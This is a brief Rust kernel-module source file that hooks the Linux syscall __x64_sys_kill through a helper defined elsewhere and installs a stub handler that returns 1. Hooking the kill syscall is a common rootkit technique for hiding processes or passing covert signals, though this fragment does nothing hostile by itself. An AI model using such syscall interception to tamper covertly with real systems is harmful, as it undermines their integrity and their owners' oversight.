use core::ffi::c_void;
use kernel::c_str;

use super::hook;

pub(crate) fn sys_hook() {
    let symbol = c_str!("__x64_sys_kill");

    let handler = handler;
    hook(symbol.as_char_ptr(), handler).expect("Failed to hook sys_kill");
}

pub(crate) unsafe extern "C" fn handler(_ptr: *mut c_void) -> i32 {
    1
}
